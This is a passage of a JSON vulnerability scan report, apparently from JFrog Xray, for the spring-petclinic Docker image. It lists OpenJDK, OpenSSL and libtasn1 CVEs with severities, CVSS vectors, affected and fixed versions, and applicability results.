               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2024-9143",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-195301",
         "severity": "Low",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "cpp",
         "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Serialization). Supported versions that are affected are Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 3.7 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N).",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "oracle:openjdk",
         "source_id": "cpp://oracle:openjdk",
         "source_comp_id": "cpp://oracle:openjdk:17",
         "component_versions": {
            "id": "oracle:openjdk",
            "vulnerable_versions": [
               "< 7.331",
               "11.0.0 ≤ Version < 11.0.14",
               "17.0.0 ≤ Version < 17.0.2",
               "8.0.0 ≤ Version < 8.321"
            ],
            "fixed_versions": [
               "11.0.14",
               "17.0.2",
               "7.331",
               "8.321"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-21248",
                     "cwe": [
                        "NVD-CWE-noinfo"
                     ],
                     "cvss_v2": "4.3/CVSS:2.0/AV:N/AC:M/Au:N/C:N/I:P/A:N",
                     "cvss_v3": "3.7/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N"
                  }
               ],
               "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Serialization). Supported versions that are affected are Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 3.7 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N).",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/java",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/lib/libjava.so",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/javac",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/lib/libjavajpeg.so",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/javap",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/javadoc"
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2022-21248",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-670233",
         "severity": "Unknown",
         "jfrog_severity": "Medium",
         "severity_source": "Unknown",
         "pkg_type": "alpine",
         "summary": "Issue summary: Clients using RFC7250 Raw Public Keys (RPKs) to authenticate a\nserver may fail to notice that the server was not authenticated, because\nhandshakes don't abort as expected when the SSL_VERIFY_PEER verification mode\nis set.\n\nImpact summary: TLS and DTLS connections using raw public keys may be\nvulnerable to man-in-middle attacks when server authentication failure is not\ndetected by clients.\n\nRPKs are disabled by default in both TLS clients and TLS servers.  The issue\nonly arises when TLS clients explicitly enable RPK use by the server, and the\nserver, likewise, enables sending of an RPK instead of an X.509 certificate\nchain.  The affected clients are those that then rely on the handshake to\nfail when the server's RPK fails to match one of the expected public keys,\nby setting the verification mode to SSL_VERIFY_PEER.\n\nClients that enable server-side raw public keys can still find out that raw\npublic key verification failed by calling SSL_get_verify_result(), and those\nthat do, and take appropriate action, are not affected.  This issue was\nintroduced in the initial implementation of RPK support in OpenSSL 3.2.\n\nThe FIPS modules in 3.4, 3.3, 3.2, 3.1 and 3.0 are not affected by this issue.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libssl1.1",
         "source_id": "alpine://3.14:libssl1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libssl1.1",
            "vulnerable_versions": [
               "< 3.3.3-r0"
            ],
            "fixed_versions": [
               "3.3.3-r0"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-12797"
                  }
               ],
               "description": "Issue summary: Clients using RFC7250 Raw Public Keys (RPKs) to authenticate a\nserver may fail to notice that the server was not authenticated, because\nhandshakes don't abort as expected when the SSL_VERIFY_PEER verification mode\nis set.\n\nImpact summary: TLS and DTLS connections using raw public keys may be\nvulnerable to man-in-middle attacks when server authentication failure is not\ndetected by clients.\n\nRPKs are disabled by default in both TLS clients and TLS servers.  The issue\nonly arises when TLS clients explicitly enable RPK use by the server, and the\nserver, likewise, enables sending of an RPK instead of an X.509 certificate\nchain.  The affected clients are those that then rely on the handshake to\nfail when the server's RPK fails to match one of the expected public keys,\nby setting the verification mode to SSL_VERIFY_PEER.\n\nClients that enable server-side raw public keys can still find out that raw\npublic key verification failed by calling SSL_get_verify_result(), and those\nthat do, and take appropriate action, are not affected.  This issue was\nintroduced in the initial implementation of RPK support in OpenSSL 3.2.\n\nThe FIPS modules in 3.4, 3.3, 3.2, 3.1 and 3.0 are not affected by this issue.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-670233",
            "VulnerabilityTitle": "",
            "ShortDescription": "A design problem in OpenSSL may allow network attackers to perform man-in-the-middle attacks when raw public keys are used.",
            "FullDescription": "OpenSSL is an open-source cryptographic library and toolset that provides a wide range of protocol supported and functions for secure communication, data encryption, digital certificates, and other cryptographic operations, widely used in various software applications and systems.\nIn OpenSSL, the `SSL_VERIFY_PEER` verification mode is used to enforce the verification of the remote server's SSL/TLS certificate during the handshake process of a secure connection. When this mode is set, the client (or server, depending on the context) will check the validity of the presented certificate against a criteria set.\n\nRaw public keys (RPK) are a cryptographic method in public key infrastructure (PKI) that represent a public key without a digital certificate. Unlike certificates, which include extra details like identity and expiration, raw public keys are simpler and more efficient, making them ideal for resource-limited environments.\n\nIn OpenSSL, connections made using TLS and DTLS with RPKs may allow attackers to man-in-the-middle if clients fail to recognize a failure in server authentication. The problem only emerges when TLS clients deliberately activate RPK usage for the server, which in turn chooses to transmit an RPK instead of an X.509 certificate chain. The clients that are impacted are those that expect the handshake to fail if the server’s RPK does not align with one of the anticipated public keys, as determined by setting the verification mode to `SSL_VERIFY_PEER`.\n\nClients that enable server-side RPKs can still find out that RPK verification failed by calling the `SSL_get_verify_result()` function. If this check is made right after the handshake, clients can abort the communication in the proper cases and therefore will not be vulnerable.\n\nNote: By default, RPKs are turned off in both TLS clients and servers.",
            "Impact": 5,
            "VulnerabilityType": "Data leakage",
            "Resolution": "##### Development mitigations\n\nClients that enable server-side RPKs can still find out that RPK verification failed by calling the `SSL_get_verify_result()` function. If this check is made right after the handshake, clients can abort the communication in the proper cases and therefore will not be vulnerable.\n\nexample:\n```\n int verify_result = SSL_get_verify_result(ssl);\n    if (verify_result == X509_V_OK) {\n        /* The server's raw public key matched the TLSA record */\n    } else if (verify_result == X509_V_ERR_DANE_NO_MATCH) {\n       /*\n     * The server's raw public key, or public key in certificate, did not\n     * match the TLSA record\n     */\n    } else if (verify_result == X509_V_ERR_RPK_UNTRUSTED) {\n        /*\n        * No TLSA records of the correct type are available to verify the\n        * server's raw public key. This would not happen in this example,\n        * as a TLSA record is configured.\n        }*/\n    else {\n        /* Some other verify error */\n    }\n```",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue results in a severe impact (such as remote code execution)",
                  "Description": "Data leakage.",
                  "IsPositive": 0,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "Raw Public Keys are disabled by default in both TLS clients and TLS servers, which is mandatory to exploit this CVE.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can be exploited by attackers over the network",
                  "Description": "The attacker must be able to intercept the communication between the client and the server using a man-in-the-middle attack.",
                  "IsPositive": 0,
                  "InsertOrder": 3
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Fix Commit",
                  "Url": "https://github.com/openssl/openssl/commit/738d4f9fdeaad57660dcba50a619fafced3fd5e9",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "cve_id": "CVE-2024-12797",
            "scan_status": 1,
            "applicability": null,
            "evidence": null,
            "info": "Applicability cannot be determined since exploitation depends on the usage of raw public keys (RPKs). Specifically - the client must enable RPK and connect to a remote server",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "vulnerability_id": "CVE-2024-12797",
            "result": "undetermined"
         }
      },
      {
         "id": "XRAY-670233",
         "severity": "Unknown",
         "jfrog_severity": "Medium",
         "severity_source": "Unknown",
         "pkg_type": "alpine",
         "summary": "Issue summary: Clients using RFC7250 Raw Public Keys (RPKs) to authenticate a\nserver may fail to notice that the server was not authenticated, because\nhandshakes don't abort as expected when the SSL_VERIFY_PEER verification mode\nis set.\n\nImpact summary: TLS and DTLS connections using raw public keys may be\nvulnerable to man-in-middle attacks when server authentication failure is not\ndetected by clients.\n\nRPKs are disabled by default in both TLS clients and TLS servers.  The issue\nonly arises when TLS clients explicitly enable RPK use by the server, and the\nserver, likewise, enables sending of an RPK instead of an X.509 certificate\nchain.  The affected clients are those that then rely on the handshake to\nfail when the server's RPK fails to match one of the expected public keys,\nby setting the verification mode to SSL_VERIFY_PEER.\n\nClients that enable server-side raw public keys can still find out that raw\npublic key verification failed by calling SSL_get_verify_result(), and those\nthat do, and take appropriate action, are not affected.  This issue was\nintroduced in the initial implementation of RPK support in OpenSSL 3.2.\n\nThe FIPS modules in 3.4, 3.3, 3.2, 3.1 and 3.0 are not affected by this issue.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libcrypto1.1",
         "source_id": "alpine://3.14:libcrypto1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libcrypto1.1",
            "vulnerable_versions": [
               "< 3.3.3-r0"
            ],
            "fixed_versions": [
               "3.3.3-r0"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-12797"
                  }
               ],
               "description": "Issue summary: Clients using RFC7250 Raw Public Keys (RPKs) to authenticate a\nserver may fail to notice that the server was not authenticated, because\nhandshakes don't abort as expected when the SSL_VERIFY_PEER verification mode\nis set.\n\nImpact summary: TLS and DTLS connections using raw public keys may be\nvulnerable to man-in-middle attacks when server authentication failure is not\ndetected by clients.\n\nRPKs are disabled by default in both TLS clients and TLS servers.  The issue\nonly arises when TLS clients explicitly enable RPK use by the server, and the\nserver, likewise, enables sending of an RPK instead of an X.509 certificate\nchain.  The affected clients are those that then rely on the handshake to\nfail when the server's RPK fails to match one of the expected public keys,\nby setting the verification mode to SSL_VERIFY_PEER.\n\nClients that enable server-side raw public keys can still find out that raw\npublic key verification failed by calling SSL_get_verify_result(), and those\nthat do, and take appropriate action, are not affected.  This issue was\nintroduced in the initial implementation of RPK support in OpenSSL 3.2.\n\nThe FIPS modules in 3.4, 3.3, 3.2, 3.1 and 3.0 are not affected by this issue.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-670233",
            "VulnerabilityTitle": "",
            "ShortDescription": "A design problem in OpenSSL may allow network attackers to perform man-in-the-middle attacks when raw public keys are used.",
            "FullDescription": "OpenSSL is an open-source cryptographic library and toolset that provides a wide range of protocol supported and functions for secure communication, data encryption, digital certificates, and other cryptographic operations, widely used in various software applications and systems.\nIn OpenSSL, the `SSL_VERIFY_PEER` verification mode is used to enforce the verification of the remote server's SSL/TLS certificate during the handshake process of a secure connection. When this mode is set, the client (or server, depending on the context) will check the validity of the presented certificate against a criteria set.\n\nRaw public keys (RPK) are a cryptographic method in public key infrastructure (PKI) that represent a public key without a digital certificate. Unlike certificates, which include extra details like identity and expiration, raw public keys are simpler and more efficient, making them ideal for resource-limited environments.\n\nIn OpenSSL, connections made using TLS and DTLS with RPKs may allow attackers to man-in-the-middle if clients fail to recognize a failure in server authentication. The problem only emerges when TLS clients deliberately activate RPK usage for the server, which in turn chooses to transmit an RPK instead of an X.509 certificate chain. The clients that are impacted are those that expect the handshake to fail if the server’s RPK does not align with one of the anticipated public keys, as determined by setting the verification mode to `SSL_VERIFY_PEER`.\n\nClients that enable server-side RPKs can still find out that RPK verification failed by calling the `SSL_get_verify_result()` function. If this check is made right after the handshake, clients can abort the communication in the proper cases and therefore will not be vulnerable.\n\nNote: By default, RPKs are turned off in both TLS clients and servers.",
            "Impact": 5,
            "VulnerabilityType": "Data leakage",
            "Resolution": "##### Development mitigations\n\nClients that enable server-side RPKs can still find out that RPK verification failed by calling the `SSL_get_verify_result()` function. If this check is made right after the handshake, clients can abort the communication in the proper cases and therefore will not be vulnerable.\n\nexample:\n```\n int verify_result = SSL_get_verify_result(ssl);\n    if (verify_result == X509_V_OK) {\n        /* The server's raw public key matched the TLSA record */\n    } else if (verify_result == X509_V_ERR_DANE_NO_MATCH) {\n       /*\n     * The server's raw public key, or public key in certificate, did not\n     * match the TLSA record\n     */\n    } else if (verify_result == X509_V_ERR_RPK_UNTRUSTED) {\n        /*\n        * No TLSA records of the correct type are available to verify the\n        * server's raw public key. This would not happen in this example,\n        * as a TLSA record is configured.\n        }*/\n    else {\n        /* Some other verify error */\n    }\n```",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue results in a severe impact (such as remote code execution)",
                  "Description": "Data leakage.",
                  "IsPositive": 0,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "Raw Public Keys are disabled by default in both TLS clients and TLS servers, which is mandatory to exploit this CVE.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can be exploited by attackers over the network",
                  "Description": "The attacker must be able to intercept the communication between the client and the server using a man-in-the-middle attack.",
                  "IsPositive": 0,
                  "InsertOrder": 3
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Fix Commit",
                  "Url": "https://github.com/openssl/openssl/commit/738d4f9fdeaad57660dcba50a619fafced3fd5e9",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "cve_id": "CVE-2024-12797",
            "scan_status": 1,
            "applicability": null,
            "evidence": null,
            "info": "Applicability cannot be determined since exploitation depends on the usage of raw public keys (RPKs). Specifically - the client must enable RPK and connect to a remote server",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
            "vulnerability_id": "CVE-2024-12797",
            "result": "undetermined"
         }
      },
      {
         "id": "XRAY-670061",
         "severity": "Unknown",
         "severity_source": "Unknown",
         "pkg_type": "alpine",
         "summary": "A flaw in libtasn1 causes inefficient handling of specific certificate data. When processing a large number of elements in a certificate, libtasn1 takes much longer than expected, which can slow down or even crash the system. This flaw allows an attacker to send a specially crafted certificate, causing a denial of service attack.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libtasn1",
         "source_id": "alpine://3.14:libtasn1",
         "source_comp_id": "alpine://3.14:libtasn1:4.17.0-r0",
         "component_versions": {
            "id": "3.14:libtasn1",
            "vulnerable_versions": [
               "< 4.20.0-r0"
            ],
            "fixed_versions": [
               "4.20.0-r0"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-12133"
                  }
               ],
               "description": "A flaw in libtasn1 causes inefficient handling of specific certificate data. When processing a large number of elements in a certificate, libtasn1 takes much longer than expected, which can slow down or even crash the system. This flaw allows an attacker to send a specially crafted certificate, causing a denial of service attack.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2024-12133",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-670060",
         "severity": "Unknown",
         "severity_source": "Unknown",
         "pkg_type": "alpine",
         "summary": "Issue summary: A timing side-channel which could potentially allow recovering\nthe private key exists in the ECDSA signature computation.\n\nImpact summary: A timing side-channel in ECDSA signature computations\ncould allow recovering the private key by an attacker. However, measuring\nthe timing would require either local access to the signing application or\na very fast network connection with low latency.\n\nThere is a timing signal of around 300 nanoseconds when the top word of\nthe inverted ECDSA nonce value is zero. This can happen with significant\nprobability only for some of the supported elliptic curves. In particular\nthe NIST P-521 curve is affected. To be able to measure this leak, the attacker\nprocess must either be located in the same physical computer or must\nhave a very fast network connection with low latency. For that reason\nthe severity of this vulnerability is Low.\n\nThe FIPS modules in 3.4, 3.3, 3.2, 3.1 and 3.0 are affected by this issue.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libcrypto1.1",
         "source_id": "alpine://3.14:libcrypto1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libcrypto1.1",
            "vulnerable_versions": [
               "< 3.3.2-r5"
            ],
            "fixed_versions": [
               "3.3.2-r5"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-13176"
                  }
               ],
               "description": "Issue summary: A timing side-channel which could potentially allow recovering\nthe private key exists in the ECDSA signature computation.\n\nImpact summary: A timing side-channel in ECDSA signature computations\ncould allow recovering the private key by an attacker. However, measuring\nthe timing would require either local access to the signing application or\na very fast network connection with low latency.\n\nThere is a timing signal of around 300 nanoseconds when the top word of\nthe inverted ECDSA nonce value is zero. This can happen with significant\nprobability only for some of the supported elliptic curves. In particular\nthe NIST P-521 curve is affected. To be able to measure this leak, the attacker\nprocess must either be located in the same physical computer or must\nhave a very fast network connection with low latency. For that reason\nthe severity of this vulnerability is Low.\n\nThe FIPS modules in 3.4, 3.3, 3.2, 3.1 and 3.0 are affected by this issue.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2024-13176",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-670060",
         "severity": "Unknown",
         "severity_source": "Unknown",
         "pkg_type": "alpine",
         "summary": "Issue summary: A timing side-channel which could potentially allow recovering\nthe private key exists in the ECDSA signature computation.\n\nImpact summary: A timing side-channel in ECDSA signature computations\ncould allow recovering the private key by an attacker. However, measuring\nthe timing would require either local access to the signing application or\na very fast network connection with low latency.\n\nThere is a timing signal of around 300 nanoseconds when the top word of\nthe inverted ECDSA nonce value is zero. This can happen with significant\nprobability only for some of the supported elliptic curves. In particular\nthe NIST P-521 curve is affected. To be able to measure this leak, the attacker\nprocess must either be located in the same physical computer or must\nhave a very fast network connection with low latency. For that reason\nthe severity of this vulnerability is Low.\n\nThe FIPS modules in 3.4, 3.3, 3.2, 3.1 and 3.0 are affected by this issue.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libssl1.1",
         "source_id": "alpine://3.14:libssl1.1",
         "source_comp_id": "alpine://3.14:libssl1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libssl1.1",
            "vulnerable_versions": [
               "< 3.3.2-r5"
            ],
            "fixed_versions": [
               "3.3.2-r5"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-13176"
                  }
               ],
               "description": "Issue summary: A timing side-channel which could potentially allow recovering\nthe private key exists in the ECDSA signature computation.\n\nImpact summary: A timing side-channel in ECDSA signature computations\ncould allow recovering the private key by an attacker. However, measuring\nthe timing would require either local access to the signing application or\na very fast network connection with low latency.\n\nThere is a timing signal of around 300 nanoseconds when the top word of\nthe inverted ECDSA nonce value is zero. This can happen with significant\nprobability only for some of the supported elliptic curves. In particular\nthe NIST P-521 curve is affected. To be able to measure this leak, the attacker\nprocess must either be located in the same physical computer or must\nhave a very fast network connection with low latency. For that reason\nthe severity of this vulnerability is Low.\n\nThe FIPS modules in 3.4, 3.3, 3.2, 3.1 and 3.0 are affected by this issue.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2024-13176",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-645486",
         "severity": "Unknown",
         "severity_source": "Unknown",
         "pkg_type": "alpine",
         "summary": "A vulnerability was found in Golang FIPS OpenSSL. This flaw allows a malicious user to randomly cause an uninitialized buffer length variable with a zeroed buffer to be returned in FIPS mode. It may also be possible to force a false positive match between non-equal hashes when comparing a trusted computed hmac sum to an untrusted input sum if an attacker can send a zeroed buffer in place of a pre-computed sum.  It is also possible to force a derived key to be all zeros instead of an unpredictable value.  This may have follow-on implications for the Go TLS stack.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libcrypto1.1",
         "source_id": "alpine://3.14:libcrypto1.1",
         "source_comp_id": "alpine://3.14:libcrypto1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libcrypto1.1",
            "vulnerable_versions": [
               "≤ 1.1.1t-r2"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-9355"
                  }
               ],
               "description": "A vulnerability was found in Golang FIPS OpenSSL. This flaw allows a malicious user to randomly cause an uninitialized buffer length variable with a zeroed buffer to be returned in FIPS mode. It may also be possible to force a false positive match between non-equal hashes when comparing a trusted computed hmac sum to an untrusted input sum if an attacker can send a zeroed buffer in place of a pre-computed sum.  It is also possible to force a derived key to be all zeros instead of an unpredictable value.  This may have follow-on implications for the Go TLS stack.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2024-9355",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-645486",
         "severity": "Unknown",
         "severity_source": "Unknown",
         "pkg_type": "alpine",
         "summary": "A vulnerability was found in Golang FIPS OpenSSL. This flaw allows a malicious user to randomly cause an uninitialized buffer length variable with a zeroed buffer to be returned in FIPS mode. It may also be possible to force a false positive match between non-equal hashes when comparing a trusted computed hmac sum to an untrusted input sum if an attacker can send a zeroed buffer in place of a pre-computed sum.  It is also possible to force a derived key to be all zeros instead of an unpredictable value.  This may have follow-on implications for the Go TLS stack.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libssl1.1",
         "source_id": "alpine://3.14:libssl1.1",
         "source_comp_id": "alpine://3.14:libssl1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libssl1.1",
            "vulnerable_versions": [
               "≤ 1.1.1t-r2"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-9355"
                  }
               ],
               "description": "A vulnerability was found in Golang FIPS OpenSSL. This flaw allows a malicious user to randomly cause an uninitialized buffer length variable with a zeroed buffer to be returned in FIPS mode. It may also be possible to force a false positive match between non-equal hashes when comparing a trusted computed hmac sum to an untrusted input sum if an attacker can send a zeroed buffer in place of a pre-computed sum.  It is also possible to force a derived key to be all zeros instead of an unpredictable value.  This may have follow-on implications for the Go TLS stack.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2024-9355",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-601459",
         "severity": "Unknown",
         "severity_source": "Unknown",
         "pkg_type": "alpine",
         "summary": "Issue summary: Checking excessively long DSA keys or parameters may be very\nslow.\n\nImpact summary: Applications that use the functions EVP_PKEY_param_check()\nor EVP_PKEY_public_check() to check a DSA public key or DSA parameters may\nexperience long delays. Where the key or parameters that are being checked\nhave been obtained from an untrusted source this may lead to a Denial of\nService.\n\nThe functions EVP_PKEY_param_check() or EVP_PKEY_public_check() perform\nvarious checks on DSA parameters. Some of those computations take a long time\nif the modulus (`p` parameter) is too large.\n\nTrying to use a very large modulus is slow and OpenSSL will not allow using\npublic keys with a modulus which is over 10,000 bits in length for signature\nverification. However the key and parameter check functions do not limit\nthe modulus size when performing the checks.\n\nAn application that calls EVP_PKEY_param_check() or EVP_PKEY_public_check()\nand supplies a key or parameters obtained from an untrusted source could be\nvulnerable to a Denial of Service attack.\n\nThese functions are not called by OpenSSL itself on untrusted DSA keys so\nonly applications that directly call these functions may be vulnerable.\n\nAlso vulnerable are the OpenSSL pkey and pkeyparam command line applications\nwhen using the `-check` option.\n\nThe OpenSSL SSL/TLS implementation is not affected by this issue.\n\nThe OpenSSL 3.0 and 3.1 FIPS providers are affected by this issue.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:libssl1.1",
         "source_id": "alpine://3.14:libssl1.1",
         "source_comp_id": "alpine://3.14:libssl1.1:1.1.1k-r0",
         "component_versions": {
            "id": "3.14:libssl1.1",
            "vulnerable_versions": [
               "< 3.3.0-r2"
            ],
            "fixed_versions": [
               "3.3.0-r2"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-4603"
                  }
               ],
               "description": "Issue summary: Checking excessively long DSA keys or parameters may be very\nslow.\n\nImpact summary: Applications that use the functions EVP_PKEY_param_check()\nor EVP_PKEY_public_check() to check a DSA public key or DSA parameters may\nexperience long delays. Where the key or parameters that are being checked\nhave been obtained from an untrusted source this may lead to a Denial of\nService.\n\nThe functions EVP_PKEY_param_check() or EVP_PKEY_public_check() perform\nvarious checks on DSA parameters. Some of those computations take a long time\nif the modulus (`p` parameter) is too large.\n\nTrying to use a very large modulus is slow and OpenSSL will not allow using\npublic keys with a modulus which is over 10,000 bits in length for signature\nverification. However the key and parameter check functions do not limit\nthe modulus size when performing the checks.\n\nAn application that calls EVP_PKEY_param_check() or EVP_PKEY_public_check()\nand supplies a key or parameters obtained from an untrusted source could be\nvulnerable to a Denial of Service attack.\n\nThese functions are not called by OpenSSL itself on untrusted DSA keys so\nonly applications that directly call these functions may be vulnerable.\n\nAlso vulnerable are the OpenSSL pkey and pkeyparam command line applications\nwhen using the `-check` option.\n\nThe OpenSSL SSL/TLS implementation is not affected by this issue.\n\nThe OpenSSL 3.0 and 3.1 FIPS providers are affected by this issue.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
